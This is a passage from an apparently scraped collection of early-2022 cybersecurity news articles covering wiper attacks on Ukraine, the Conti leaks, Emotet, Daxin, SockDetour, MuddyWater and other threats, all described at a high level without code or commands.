and the deployment of HermeticWiper through the default domain policy in at least one instance, suggesting the attackers had prior access to one of that victim’s Active Directory servers,“ said Jean-Ian Boutin, ESET head of threat research.\n\nAlso unknown are the initial access vectors used to deploy both the wipers, although it’s suspected that the attackers leveraged tools like Impacket and RemCom, a remote access software, for lateral movement and malware distribution.\nFurthermore, IsaacWiper shares no code-level overlaps with HermeticWiper and is substantially less sophisticated, even as it sets out to enumerate all the physical and logical drives before proceeding to carry out its file wiping operations.\n“On February 25, 2022, attackers dropped a new version of IsaacWiper with debug logs,“ the researchers said. “This may indicate that the attackers were unable to wipe some of the targeted machines and added log messages to understand what was happening.“\nUpdate: Microsoft, which is tracking HermeticWiper under the name FoxBlade (and HermeticRansom as SonicVote), said the “intended objective of these attacks is the disruption, degradation, and destruction of targeted resources“ in Ukraine.\nThe infections impacted “hundreds of systems spanning multiple government, information technology, financial sector, and energy organizations predominantly located in or with a nexus to Ukraine,“ it noted.\nThe tech giant’s Threat Intelligence Center (MSTIC) has attributed the attacks to an emerging threat cluster designated as DEV-0665, pointing out its lack of affiliation to a previously known threat activity group. It’s worth noting here that the actor responsible for the WhisperGate wiper attacks in January is known as DEV-0586.\nAssigning IsaacWiper-related intrusions the moniker Lasainraw, Microsoft also characterized them as a “limited destructive malware attack,“ adding it’s “continuing to investigate this incident and has not currently linked it to known threat activity.“\n\n\nFound this article interesting?

{'title': 'Conti Ransomware Gang’s Internal Chats Leaked Online After Siding With Russia',
'text': 'Days after the Conti ransomware group broadcasted a pro-Russian message pledging its allegiance to Vladimir Putin’s ongoing invasion of Ukraine, an anonymous security researcher using the Twitter handle @ContiLeaks has leaked the syndicate’s internal chats.\nThe file dump, published by malware research group VX-Underground, is said to contain 13 months of chat logs between affiliates and administrators of the Russia-affiliated ransomware group from June 2020 to February 2022, in a move that’s expected to offer unprecedented insight into the criminal enterprise’s inner workings.\n“Glory to Ukraine,“ the leaker said in their message.\nThe shared conversations show that Conti used fake front companies to attempt to schedule product demos with security firms like CarbonBlack and Sophos to obtain code signing certificates, with the operators working in scrum sprints to complete the software development tasks.\n\nAdditionally, the messages confirm the shutdown of the TrickBot botnet last week as well as highlight the Conti group’s close relationship with the TrickBot and Emotet malware gangs, the latter of which was resurrected late last year through TrickBot.\nA message sent by one of the members of the group on February 14, 2022 goes: “TrickBot does not work. The project was closed.“\nOn top of that, the leaker is also believed to have released the source code associated with TrickBot’s command dispatcher and data collector modules, not to mention the ransomware group’s internal documentation, its administrative panel, and a password-protected archive containing the source code for the locker, decryptor, and the builder.\nSource: Émilio Gonzalez (@res260)Source: Émilio Gonzalez (@res260)\nThe development comes as the Russo-Ukrainian conflict has splintered the cybercrime underground into two warring factions, with a growing number of hacking actors picking sides between the two countries on the digital front.\nThe Conti team, in a blog post on its dark web portal last week, avowed its “full support“ to the Russian invasion, and threatened to retaliate against critical infrastructure if Russia is hit with cyber or military attacks.\nIt, however, later backtracked, saying, “we do not ally with any government and we condemn the ongoing war,“ but reiterated that “We will use our resources in order to strike back if the well being and safety of peaceful citizens will be at stake due to American cyber aggression.“\n\nThe ContiLeaks saga is part of a wider effort by hacktivists and security allies, including Ukraine’s “IT army,“ to strike Russian sites, services and infrastructure as a counter to Kremlin’s military strikes. The volunteer hacking group, in messages shared on its Telegram channel, claimed that several Russian websites and state online portals have been felled by a barrage of DDoS attacks.\nSeparately, a group of Belarusian hackers known as the Cyber Partisans stated they staged an attack on the country’s train network in an effort to disrupt Russian troop movements into Ukraine, while another group called AgainstTheWest_ said it was “standing against Russia“ and that it breached a number of websites and corporations.\nThe Anonymous, for its part, also claimed responsibility for disrupting the websites of state news agencies RT, TASS, and RIA Novosti, as well as websites of newspapers Kommersant, Izvestiya, and Forbes Russia magazine and the Russian oil giant Gazprom.\nIf anything, the rapidly evolving cyber war appears to have put other groups on alert, what with LockBit ransomware operators posting a neutral message, stating “For us it is just business and we are all apolitical. We are only interested in money for our harmless and useful work.“\nThe string of “crowd sourced attacks“ by vigilante hacker groups amidst intensifying Russian military attack on Ukraine presents a “new risk of crisis escalation,“ Matt Olney, director of threat intelligence and interdiction at Cisco Talos, said.\n“The last seven days have created a wild environment of government entities, affiliated freelancers, and semi-legitimate cyber strike actors and affiliates all driven out of righteous nationalistic anger,“ Olney added. “Governments are seeking volunteers to conduct cyberattacks against the opposition. This presents a huge global risk as the potential for hostile spill-over is immense.“\n\n\nFound this article interesting?

'text': 'Even as the TrickBot infrastructure closed shop, the operators of the malware are continuing to refine and retool their arsenal to carry out attacks that culminated in the deployment of Conti ransomware.\nIBM Security X-Force, which discovered the revamped version of the criminal gang’s AnchorDNS backdoor, dubbed the new, upgraded variant AnchorMail.\nAnchorMail “uses an email-based [command-and-control] server which it communicates with using SMTP and IMAP protocols over TLS,“ IBM’s malware reverse engineer, Charlotte Hammond, said. “With the exception of the overhauled C2 communication mechanism, AnchorMail’s behavior aligns very closely to that of its AnchorDNS predecessor.“\n\nThe cybercrime actor behind TrickBot, ITG23 aka Wizard Spider, is also known for its development of the Anchor malware framework, a backdoor reserved for targeting selected high value victims since at least 2018 via TrickBot and BazarBackdoor (aka BazarLoader), an additional implant engineered by the same group.\nOver the years, the group has also benefited from a symbiotic relationship with the Conti ransomware cartel, with the latter leveraging TrickBot and BazarLoader payloads to gain a foothold for deploying the file-encrypting malware.\n“By the end of 2021, Conti had essentially acquired TrickBot, with multiple elite developers and managers joining the ransomware cosa nostra,“ AdvIntel’s Yelisey Boguslavskiy noted in a report published mid-February.\nLess than 10 days later, the TrickBot actors shut down their botnet infrastructure following an unusual two-month-long hiatus in the malware distribution campaigns, marking a pivot that’s likely to channel their efforts toward stealthier malware families such as BazarBackdoor.\nIn the midst of all these developments, the AnchorDNS backdoor has received a facelift of its own. While the predecessor communicates to its C2 servers using DNS tunneling – a technique that involves the abuse of the DNS protocol to sneak malicious traffic past an organization’s defenses – the newer C++-based version makes use of specially crafted email messages.\n\n“AnchorMail uses the encrypted SMTPS protocol for sending data to the C2, and IMAPS is used for receiving it,“ Hammond noted, adding the malware establishes persistence by creating a scheduled task that’s set to run every 10 minutes, following it up by contacting the C2 server to fetch and execute any commands to be run.\nThe commands include the capability to execute binaries, DLLs, and shellcode retrieved from the remote server, launch PowerShell commands, and delete itself from the infected systems.\n“The discovery of this new Anchor variant adds a new stealthy backdoor for use during ransomware attacks and highlights the group’s commitment to upgrading its malware,“ Hammond said. “[AnchorMail] has so far only been observed targeting Windows systems. However, as AnchorDNS has been ported to Linux, it seems likely that a Linux-variant of AnchorMail may emerge too.“\n\n\nFound this article interesting?

'text': 'UPDATE: It’s worth noting that the malware Microsoft tracks as FoxBlade is the same as the data wiper that’s been denominated HermeticWiper (aka KillDisk).\nMicrosoft on Monday disclosed that it detected a new round of offensive and destructive cyberattacks directed against Ukraine’s digital infrastructure hours before Russia launched its first missile strikes last week.\nThe intrusions involved the use of a never-before-seen malware package dubbed FoxBlade, according to the tech giant’s Threat Intelligence Center (MSTIC), noting that it added new signatures to its Defender anti-malware service to detect the exploit within three hours of the discovery.\n\n“These recent and ongoing cyberattacks have been precisely targeted, and we have not seen the use of the indiscriminate malware technology that spread across Ukraine’s economy and beyond its borders in the 2017 NotPetya attack,“ Microsoft’s President and Vice Chair, Brad Smith, said.\nAdditional technical specifics pertaining to FoxBlade, including the mode of initial access, are not known, but Microsoft in a Security Intelligence advisory stated that “this trojan can use your PC for distributed denial-of-service (DDoS) attacks without your knowledge.“\nWhat’s more, the delivery of the trojan appears to be facilitated by means of a second “downloader“ module that’s capable of retrieving and installing the malware on the compromised machines.\n\nThe disclosure comes as cyber assaults ranging from malicious data wipers to DDoS attacks have continued to rain down on Ukrainian government and banking websites, even as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned of such attacks employed beyond the country’s borders.\n“Destructive malware can present a direct threat to an organization’s daily operations, impacting the availability of critical assets and data,“ CISA said. “Further disruptive cyberattacks against organizations in Ukraine are likely to occur and may unintentionally spill over to organizations in other countries.“\n\n\nFound this article interesting?

{'title': 'China-linked Daxin Malware Targeted Multiple Governments in Espionage Attacks',
'text': 'A previously undocumented espionage tool has been deployed against selected governments and other critical infrastructure targets as part of a long-running espionage campaign orchestrated by China-linked threat actors since at least 2013.\nBroadcom’s Symantec Threat Hunter team characterized the backdoor, named Daxin, as a technologically advanced malware, allowing the attackers to carry out a variety of communications and information-gathering operations aimed at entities in the telecom, transportation, and manufacturing sectors that are of strategic interest to China.\n“Daxin malware is a highly sophisticated rootkit backdoor with complex, stealthy command-and-control (C2) functionality that enables remote actors to communicate with secured devices not connected directly to the internet,“ the U.S. Cybersecurity and Infrastructure Security Agency (CISA) said in an independent advisory.\n\nThe implant takes the form of a Windows kernel driver that implements an elaborate communications mechanism that affords the malware a high degree of stealth and the capability to talk to machines that are physically disconnected from the internet.\nIt achieves this by expressly avoiding launching its own network services, instead opting to take advantage of legitimate TCP/IP services already running on the infected computers to blend its communications with normal traffic on the target’s network and receive commands from a remote peer.\n\n“These features are reminiscent of Regin,“ the researchers noted, referring to another sophisticated malware and hacking toolkit attributed to the U.S. National Security Agency (NSA) for government spying operations back in 2014.\nAmong the unusual aspects of Daxin, besides generating no suspicious network traffic to remain unseen, is its ability to relay commands across a network of infected computers within the attacked organization, creating a “multi-node communications channel“ that permits recurring access to the compromised computers for extended periods of time.\nWhile recent intrusions involving the backdoor are said to have transpired in November 2021, Symantec said it uncovered code-level commonalities with an older piece of malware called Exforel (aka Zala), indicating that Daxin may have been built by an actor with access to the latter’s codebase or that they are the work of the same group.\n\nThe campaigns have not been attributed to a single adversary, but a timeline of the attacks shows that Daxin was installed on some of the same systems where tools associated with other Chinese espionage actors like Slug were found. This includes the deployment of both Daxin and Owprox malware on a single computer belonging to a tech company in May 2020.\n“Daxin is without doubt the most advanced piece of malware [...] used by a China-linked actor,“ the researchers said. “Considering its capabilities and the nature of its deployed attacks, Daxin appears to be optimized for use against hardened targets, allowing the attackers to burrow deep into a target’s network and exfiltrate data without raising suspicions.“\nThe disclosure arrives a week after China-based Pangu Lab outed a “top-tier“ backdoor called Bvp47 put to use by the U.S. National Security Agency for over a decade targeting as many as 287 organizations in 45 countries located chiefly in China, Korea, Japan, Germany, Spain, India, and Mexico.\n\n\nFound this article interesting?

{'title': '100 Million Samsung Galaxy Phones Affected with Flawed Hardware Encryption Feature',
'text': 'A group of academics from Tel Aviv University have disclosed details of now-patched “severe“ design flaws affecting about 100 million Android-based Samsung smartphones that could have resulted in the extraction of secret cryptographic keys.\nThe shortcomings are the result of an analysis of the cryptographic design and implementation of Android’s hardware-backed Keystore in Samsung’s Galaxy S8, S9, S10, S20, and S21 flagship devices, researchers Alon Shakevsky, Eyal Ronen, and Avishai Wool said.\nTrusted Execution Environments (TEEs) are a secure zone that provide an isolated environment for the execution of Trusted Applications (TAs) to carry out security critical tasks to ensure confidentiality and integrity.\n\nOn Android, the hardware-backed Keystore is a system that facilitates the creation and storage of cryptographic keys within the TEE, making them more difficult to be extracted from the device in a manner that prevents the underlying operating system from having direct access.\nInstead, the Android Keystore exposes APIs in the form of Keymaster TA (trusted application) to perform cryptographic operations within this environment, including secure key generation, storage, and its usage for digital signing and encryption. On Samsung mobile devices, the Keymaster TA runs in an ARM TrustZone-based TEE.\n\nHowever, security flaws uncovered in Samsung’s implementation meant that they could provide an adversary with root privileges a workable path to recover the hardware-protected private keys from the secure element. The list of issues identified is as below –\nInitialization Vector (IV) reuse in Keymaster TA (CVE-2021-25444) – An IV reuse vulnerability in Keymaster prior to SMR AUG-2021 Release 1 allows decryption of custom keyblob with privileged process. (Impacts Galaxy S9, J3 Top, J7 Top, J7 Duo, TabS4, Tab-A-S-Lite, A6 Plus, and A9S)Downgrade attack in Keymaster TA (CVE-2021-25490) – A keyblob downgrade attack in Keymaster prior to SMR Oct-2021 Release 1 allows [an] attacker to trigger IV reuse vulnerability with privileged process. (Impacts Galaxy S10, S20, and S21)\n\nIn a nutshell, successful exploitation of the flaws against the Keymaster TA could achieve unauthorized access to hardware-protected keys and data secured by the TEE. Implications of such an attack could range from an authentication bypass to advanced attacks that can break fundamental security guarantees offered by cryptographic systems.\n\nFollowing responsible disclosure in May and July 2021, the issues were addressed via security updates shipped in August and October 2021 for the affected devices. The findings are expected to be presented at the USENIX Security Symposium later this August.\n“Vendors including Samsung and Qualcomm maintain secrecy around their implementation and design of [TrustZone operating systems] and TAs,“ the researchers said. “The design and implementation details should be well audited and reviewed by independent researchers and should not rely on the difficulty of reverse engineering proprietary systems.“\n\n\nFound this article interesting?

{'title': 'Rebirth of Emotet: New Features of the Botnet and How to Detect it',
'text': 'One of the most dangerous and infamous threats is back again. In January 2021, global officials took down the botnet. Law enforcement sent a destructive update to the Emotet’s executables. And it looked like the end of the trojan’s story. \nBut the malware never ceased to surprise. \nNovember 2021, it was reported that TrickBot no longer works alone and delivers Emotet. And ANY.RUN with colleagues in the industry were among the first to notice the emergence of Emotet’s malicious documents.\nFirst Emotet malicious documents\nAnd this February, we can see a very active wave with crooks running numerous attacks, hitting the top in the rankings. If you are interested in this topic or researching malware, you can make use of the special help of ANY.RUN, the interactive sandbox for the detection and analysis of cyber threats.\nLet’s look at the new version’s changes that this disruptive malware brought this time. \nEmotet history\nEmotet is a sophisticated, constantly changing modular botnet. In 2014 the malware was just a trivial banking trojan. Since that it has acquired different features, modules, and campaigns: \n2014. Money transfer, mail spam, DDoS, and address book stealing modules.2015. Evasion functionality.2016. Mail spam, RIG 4.0 exploit kit, delivery of other trojans.2017. A spreader and address book stealer module.\nPolymorphic nature and numerous modules allow Emotet to avoid detection. The team behind the malware constantly changes its tactics, techniques, and procedures to make the existing detection rules useless. It downloads extra payloads using numerous steps to stay in the infected system. Its behavior makes malware nearly impossible to get rid of. It spreads fast, creates faulty indicators, and adapts to attackers’ needs.\nAnd on November 14, 2021, Emotet was reborn with a new version.\nWhy was Emotet reborn?\nThroughout Emotet’s history, it got several breaks. But after the global police operations in January 2021, we were ready that it would be gone for good. Joint enforcement arrested several gang members, took over servers, and destroyed backups.\nNevertheless, the botnet got back even more robust. It’s skillful at evasion techniques and uses several ways to compromise networks making it as dangerous as it used to be.\nIt was tracked that Trickbot tried to download a dynamic link library (DLL) to the system. And the DLLs turned out to be Emotet, and later, researchers confirmed the fact. \nIn 2021 after the comeback, Emotet led the top 3 of uploads in ANY.RUN sandbox. Even after such a long break, it still got popular. All statistics on Emotet trends are available in Malware Trends Tracker, and the numbers are based on the public submissions. \nTop malware uploads for the last week\nNo wonder now when its operations are back on rails, ANY. RUN’s database gets almost 3 thousand malicious samples per week. And it’s getting clear that you need to get ready for this kind of attack anytime.\nWhat new features has Emotet acquired?\nThe trojan is already a serious threat to any company. Knowing all malware updates can help avoid such a threat and be cautious. Let’s investigate what features a new version brings and how it differs from the previous ones. \nTemplates\nThe Emotet campaigns begin with a malspam email that contains Malicious Office Documents (weaponized Microsoft Office documents) or hyperlinks attached to the phishing email, which is widely distributed and lures victims into opening malicious attachments. The weaponized Microsoft Office document has a VBA code and AutoOpen macro for its execution. The Emotet group lures its victims to enable the macros, and this is the only user interaction required to initiate the attack. This user interaction allows bypassing sandboxes tests and verifications.\nEmotet distributes using malicious email campaigns that usually consist of Office Documents. And the malware gets very creative with templates of its maldocs. The botnet constantly changes them: it imitates programs’ updates, messages, files. And the content embeds the obfuscated VBA macro and makes different execution chains. The authors behind the malware trick users into enabling macros to start the attack. \nAnd a new version also has a twist. In summer 2020, Emotet used a doc with Office 365 message. The image remains unchanged, but it switched to the XLS format. Also, in this new version, the first time was used in hexadecimal and octal formats to represent the IP address from which the second stage was downloaded. A later technique was changed again, and crooks don’t use the HEX encoded IP to download the payload.\nEmotet templates in February\nNew techniques\nEmotet keeps raising the bar as a polymorphic creature by attaining new techniques. The latest malware version has come up with some minor changes in the tactics: it leverages MSHTA again. In general, Macro 4.0 leverages Excel to run either CMD, Wscript, or Powershell, which starts another process such as MSHTA or one mentioned above that downloads the main payload and runs it by rundll32. \nThe botnet is keen on masking malicious strings and content like URLs, IPs, commands, or even shellcodes. But sometimes, you can grab the list of URLs and IPs from the file’s script. You can definitely find it by yourself in ANY. RUN’s Static Discovering – just give it a try!\nURLs list from the Emotet’s fake PNG file\nCompanions\nWe know that Emotet usually drops other malware to worsen the infection. In November, it was identified that the botnet delivered the Trickbot banking trojan on the compromised hosts.\nCurrently, we can notice that Emotet works with Cobalt Strike. It is a C2 framework used by penetration testers and criminals as well. Having Cobalt Strike in the scenario means that the time between the initial infection and a ransomware attack shortens significantly.\nA list of Cobalt Strike IOCs from Emotet infection\nProcess tree\nThe chain of execution also got some modifications. In most cases, we can notice a CMD child process, a PowerShell, and Rundll32, and various samples prove that authors prefer to mix processes, constantly changing their order. The main goal behind it is to avoid detection by rulesets that identify a threat by child processes of an application.\nEmotet process tree\nCommand-line\nEmotet switched from EXE files to DLL a long time ago, so the main payload ran under the Rundll32. Abundant use of Powershell and CMD remains unchanged:\nEmotet command-line\nHow to detect and protect against Emotet? \nIf you need a fast and convenient way to get complete information on the Emotet sample – use modern tools. ANY.RUN interactive sandbox allows monitoring processes in real-time and receiving all necessary data immediately. \nSuricata rulesets successfully identify different malicious programs, including Emotet. Moreover, with the Fake net feature to reveal C2 links of a malicious sample. This functionality also helps gather malware’s IOCs.\nEmotet samples come and go, and it’s hard to keep up with them. So, we advise you to check out fresh samples that are updated daily in our public submissions. \nEmotet proves to be a beast among the most dangerous cyber threats in the wild. The malware improves its functionality and works on evading detection. That is why it is essential to rely on effective tools like ANY.RUN. \nEnjoy malware hunting!\n\n\nFound this article interesting?

{'title': 'Experts Create Apple AirTag Clone That Can Bypass Anti-Tracking Measures',
'text': 'Cybersecurity researchers have managed to build a clone of Apple Airtag that circumvents the anti-stalking protection technology built into its Find My Bluetooth-based tracking protocol.\nThe result is a stealth AirTag that can successfully track an iPhone user for over five days without triggering a tracking notification, Positive Security’s co-founder Fabian Bräunlein said in a deep-dive published last week.\nFind My is Apple’s asset tracking app that allows users to track the GPS location of iOS, iPadOS, macOS, watchOS devices, AirPods, AirTags as well as other supported third-party accessories through a connected iCloud account. It also enables users to view the location of others who have opted to share their location.\n\nThis is far from the first time weaknesses have been uncovered in Apple’s Find My system. In March 2021, the Secure Mobile Networking Lab at the Technical University of Darmstadt, Germany (SEEMO) disclosed design and implementation flaws in the protocol that can lead to a location correlation attack and unauthorized access to users’ location histories\nThen in May 2021, Bräunlein followed it up by sharing details of a communication protocol built on top of Find My that enables arbitrary data to be uploaded from non-internet-connected devices by sending “Find My“ Bluetooth broadcasts to nearby Apple devices that can carry out the data upload.\nThe development also comes as Apple, earlier this month, introduced a raft of new anti-stalking measures to AirTags to prevent their misuse associated with tracking unsuspecting individuals without their consent, inserting a warning notifying users that doing so has criminal repercussions.\n“If an AirTag, set of AirPods, or Find My network accessory is discovered to be unlawfully tracking a person, law enforcement can request any available information from Apple to support their investigation,“ Apple spells out in an updated support article.\nBut the “Find You“ AirTag clone devised by Positive Security aims to get around “every current and upcoming protection measure.“ It’s also built using OpenHaystack, an open-source framework developed by SEEMO researchers for tracking personal Bluetooth devices via Apple’s crowdsourced Find My network.\n\nBy broadcasting new, never-seen-before public keys every 30 seconds from a list of 2,000 preloaded public keys through the proof-of-concept (PoC) device, it was found that the mechanism renders the tracking device undetectable, raising no alerts in iOS and Apple’s own Tracker Detect Android app even when unwanted AirTags are present.\nInterestingly, AirGuard, which was developed by SEEMO as a third-party alternative to Tracker Detect, is capable of discovering the clone in “manual scan“ mode, calling into question the effectiveness of the safety and security barriers implemented by Apple to safeguard users from the malicious use of AirTags.\n“The ubiquitous nature of the Find My network, combined with its high accuracy and low entry cost, lowers the bar for abuse,“ SEEMO researchers Alexander Heinrich, Niklas Bittner, and Matthias Hollick said in a new paper, pointing out how “AirGuard found more actual trackers in different scenarios compared to the iOS tracking detection.“\n“Apple needs to incorporate non-genuine AirTags into their threat model, thus implementing security and anti-stalking features into the Find My protocol and ecosystem instead of in the AirTag itself, which can run modified firmware or not be an AirTag at all,“ Bräunlein said.\n\n\nFound this article interesting?

{'title': 'Social Media Hijacking Malware Spreading Through Gaming Apps on Microsoft Store',
'text': 'A new malware capable of controlling social media accounts is being distributed through Microsoft’s official app store in the form of trojanized gaming apps, infecting more than 5,000 Windows machines in Sweden, Bulgaria, Russia, Bermuda, and Spain.\nIsraeli cybersecurity company Check Point dubbed the malware “Electron Bot,“ in reference to a command-and-control (C2) domain used in recent campaigns. The identity of the attackers is not known, but evidence suggests that they could be based out of Bulgaria.\n“Electron Bot is a modular SEO poisoning malware, which is used for social media promotion and click fraud,“ Check Point’s Moshe Marelus said in a report published this week. “It is mainly distributed via the Microsoft store platform and dropped from dozens of infected applications, mostly games, which are constantly uploaded by the attackers.“\n\nThe first sign of malicious activity commenced as an ad clicker campaign that was discovered in October 2018, with the malware hiding in plain sight in the form of a Google Photos app, as disclosed by Bleeping Computer.\n\nIn the years since, the malware is said to have undergone numerous iterations that equip the malware with new features and evasive capabilities. In addition to using the cross-platform Electron framework, the bot is designed to load payloads fetched from the C2 server at run time, making it difficult to detect.\n“This enables the attackers to modify the malware’s payload and change the bots’ behavior at any given time,“ Marelus explained.\nElectron Bot’s core functionality is to open a hidden browser window in order to carry out SEO poisoning, generate clicks for ads, direct traffic to content hosted on YouTube and SoundCloud, and promote specific products to generate profits with ad clicking or increase store rating for higher sales.\nOn top of that, it also comes with functions that can control social media accounts on Facebook, Google and Sound Cloud, including registering new accounts, signing in, as well as commenting and liking other posts to increase views.\nThe attack sequence gets triggered when users download one of the infected applications (e.g., Temple Endless Runner 2) from the Microsoft store that, when launched, loads the game but also stealthily drops and installs the next stage dropper via JavaScript.\n\nAlong the way, there are steps to identify potential threat detection software from companies such as Kaspersky Lab, ESET, Norton Security, Webroot, Sophos, and F-Secure before the dropper proceeds to fetch the actual bot malware.\nThe list of game publishers that pushed the malware-laced apps is as follows –\nLupy gamesCrazy 4 gamesJeuxjeuxkeux gamesAkshi gamesGoo GamesBizzon Case\n“As the bot’s payload is loaded dynamically at every run time, the attackers can modify the code and change the bot’s behavior to high risk,“ Marelus noted. “For example, they can initialize another second stage and drop a new malware such as ransomware or a RAT. All of this can happen without the victim’s knowledge.“\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

'text': 'Ukraine’s Computer Emergency Response Team (CERT-UA) has warned of Belarusian state-sponsored hackers targeting its military personnel and related individuals as part of a phishing campaign mounted amidst Russia’s military invasion of the country.\n“Mass phishing emails have recently been observed targeting private ’i.ua’ and ’meta.ua’ accounts of Ukrainian military personnel and related individuals,“ the CERT-UA said. “After the account is compromised, the attackers, by the IMAP protocol, get access to all the messages.“\nSubsequently, the attacks leverage the contact information stored in the victim’s address book to propagate the phishing messages to other targets.\n\nThe Ukrainian government attributed the activities to a threat actor tracked as UNC1151, a Minsk-based group whose “members are officers of the Ministry of Defence of the Republic of Belarus.“ In a follow-up update, the agency said the nation-state group also targets its own citizens, while simultaneously setting its sights on Russian entities –\nAssociation of Belarusians of the World (International Social Union)Belarusian Music FestivalSamara Oblasna Public Organization “Russian-Belarusian Fraternity 2000“Dzêâslov, a Belarusian literary magazineSoviet Belarus (Sovetskaya Belorussiya), a daily newspaper in BelarusEmployees of the National Academy of the Republic of Kazakhstan, andVoice of the Motherland, a local newspaper in Belarus\nUNC1151 is the Mandiant-assigned moniker to an uncategorized threat cluster, which operates with objectives that are aligned with Belarusian government interests. The hacking group is believed to have been active since at least 2016.\n\n“UNC1151 has targeted a wide variety of governmental and private sector entities, with a focus in Ukraine, Lithuania, Latvia, Poland, and Germany,“ Mandiant researchers said in a November 2021 report. “The targeting also includes Belarusian dissidents, media entities, and journalists.“\nThe state-backed cyber espionage group has also been linked to the Ghostwriter disinformation campaign that promulgated anti-NATO and corruption-themed narratives aimed at Lithuania, Latvia, and Poland with the likely goal of undermining the governments and creating tensions in the region.\nWhat’s more, the January defacement attacks of several Ukrainian government websites with threatening messages are believed to be the handiwork of UNC1151 as well.\nHacking Groups Take Sides\nThe development follows a barrage of data wiper and distributed-denial-of-service (DDoS) attacks against Ukrainian government agencies, even as various hacking groups and ransomware syndicates are capitalizing on the chaos to take sides and further their activities.\n\n“The Anonymous collective is officially in cyber war against the Russian government,“ the decentralized hacktivist group tweeted, adding it “leaked the database of the Russian Ministry of Defense website.“\n\nAnother group that has declared its fealty to Ukraine is the vigilante group known as GhostSec (short for Ghost Security), which announced it had flooded Russian military websites with DDoS attacks “in support of the people in Ukraine.“\n\nThe Conti ransomware cartel, which recently absorbed the now-shuttered TrickBot trojan, rallied its “full support“ behind the Russian government, threatening to “strike back at the critical infrastructures of an enemy“ should “anybody will decide to organize a cyber attack or any war activities against Russia.“\nThe group, however, later rephrased its statement to state that “we do not ally with any government and we condemn the ongoing war.“ But the Conti team also maintained that it “will use our full capacity to deliver retaliatory measures in case the Western warmongers attempt to target critical infrastructure in Russia or any Russian-speaking region of the world.“\nOther hacking entities to declare allegiance to Russia are the RedBanditsRU cybercrime group and the lesser-known CoomingProject ransomware program, which pledged to “help the Russian government if cyber attacks and conduct against Russia.“\nThe ripple effects from the war have also prompted the Ukrainian government to form a volunteer “IT Army“ to conduct operational tasks against Russia on the cyber frontline. “We are creating an IT army,“ Ukraine’s Minister for Digital Transformation Mykhaylo Fedorov said Friday. “We need digital talents.“\nThe tasks encouraged more than 195,000 members of a newly set up Telegram group to “use any vectors of cyber and DDoS attacks“ on the websites of Russian and Belarusian business corporations, banks, and government entities, as well as media websites and YouTube channels that “openly lie about the war in Ukraine.“\n\n\nFound this article interesting?

{'title': 'New “SockDetour“ Fileless, Socketless Backdoor Targets U.S. Defense Contractors',
'text': 'Cybersecurity researchers have taken the wraps off a previously undocumented and stealthy custom malware called SockDetour that targeted U.S.-based defense contractors with the goal of being used as a secondary implant on compromised Windows hosts.\n“SockDetour is a backdoor that is designed to remain stealthily on compromised Windows servers so that it can serve as a backup backdoor in case the primary one fails,“ Palo Alto Networks’ Unit 42 threat intelligence said in a report published Thursday. “It is difficult to detect, since it operates filelessly and socketlessly on compromised Windows servers.“\nEven more concerningly, SockDetour is believed to have been used in attacks since at least July 2019, based on a compilation timestamp on the sample, implying that the backdoor successfully managed to slip past detection for over two-and-a-half years.\n\nThe attacks have been attributed to a threat cluster it tracks as TiltedTemple (aka DEV-0322 by Microsoft), which is the designated moniker for a hacking group operating out of China and was instrumental in exploiting zero-day flaws in Zoho ManageEngine ADSelfService Plus and ServiceDesk Plus deployments as a launchpad for malware attacks last year.\nThe ties to TiltedTemple come from overlaps in the attack infrastructure, with one of the command-and-control (C2) servers that was used to facilitate the distribution of malware for the late 2021 campaigns also hosting the SockDetour backdoor, alongside a memory dumping utility and numerous web shells for remote access.\nUnit 42 said it unearthed evidence of at least four defense contractors targeted by the new wave of attacks, resulting in the compromise of one of them.\nThe intrusions also predate the attacks that occurred through compromised Zoho ManageEngine servers in August 2021 by a month. Analysis of the campaign has revealed that SockDetour was delivered from an external FTP server to a U.S.-based defense contractor’s internet-facing Windows server on July 27, 2021.\n\n“The FTP server that hosted SockDetour was a compromised Quality Network Appliance Provider (QNAP) small office and home office (SOHO) network-attached storage (NAS) server,“ the researchers pointed out. “The NAS server is known to have multiple vulnerabilities, including a remote code execution vulnerability, CVE-2021-28799.“\nWhat’s more, the same server is said to have been already infected with the QLocker ransomware, raising the possibility the TiltedTemple actor leveraged the aforementioned flaw to gain unauthorized initial access.\nSockDetour, for its part, is fashioned as a stand-in backdoor that hijacks legitimate processes’ network sockets to establish its own encrypted C2 channel, followed by loading an unidentified plugin DLL file retrieved from the server.\n“Thus, SockDetour requires neither opening a listening port from which to receive a connection nor calling out to an external network to establish a remote C2 channel,“ the researchers said. “This makes the backdoor more difficult to detect from both host and network level.“\n\n\nFound this article interesting?

{'title': 'Iran’s MuddyWater Hacker Group Using New Malware in Worldwide Cyber Attacks',
'text': 'Cybersecurity agencies from the U.K. and the U.S. have laid bare a new malware used by the Iranian government-sponsored advanced persistent threat (APT) group in attacks targeting government and commercial networks worldwide.\n“MuddyWater actors are positioned both to provide stolen data and accesses to the Iranian government and to share these with other malicious cyber actors,“ the agencies said.\nThe joint advisory comes courtesy of the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Cyber Command Cyber National Mission Force (CNMF), and the U.K.’s National Cyber Security Centre (NCSC).\nThe cyberespionage actor was outed this year as conducting malicious operations as part of Iran’s Ministry of Intelligence and Security (MOIS) targeting a wide range of government and private-sector organizations, including telecommunications, defense, local government, and oil and natural gas sectors, in Asia, Africa, Europe, and North America.\n\nMuddyWater is also tracked by the wider cybersecurity community under the names Earth Vetala, MERCURY, Static Kitten, Seedworm, and TEMP.Zagros, with the group known for cyber offensives in support of MOIS objectives since roughly 2018.\nBesides exploiting publicly reported vulnerabilities, the hacking collective has been historically observed employing open-source tools to gain access to sensitive data, deploy ransomware, and achieve persistence on victim networks.\nA follow-on investigation by Cisco Talos late last month also uncovered a previously undocumented malware campaign aimed at Turkish private organizations and governmental institutions with the goal of deploying a PowerShell-based backdoor.\nThe new activities unmasked by the intelligence authorities are no different in that they make use of obfuscated PowerShell scripts to conceal the most damaging parts of the attacks, including command-and-control (C2) functions.\nThe intrusions are facilitated via a spear-phishing campaign that attempts to coax its targets into downloading suspicious ZIP archives that either contain an Excel file with a malicious macro that communicates with the actor’s C2 server or a PDF file that drops a malicious payload to the infected system.\n“Additionally, the group uses multiple malware sets — including PowGoop, Small Sieve, Canopy/Starwhale, Mori, and POWERSTATS — for loading malware, backdoor access, persistence, and exfiltration,“ FBI, CISA, CNMF, and NCSC said.\n\nWhile PowGoop functions as a loader responsible for downloading second-stage PowerShell scripts, Small Sieve is described as a 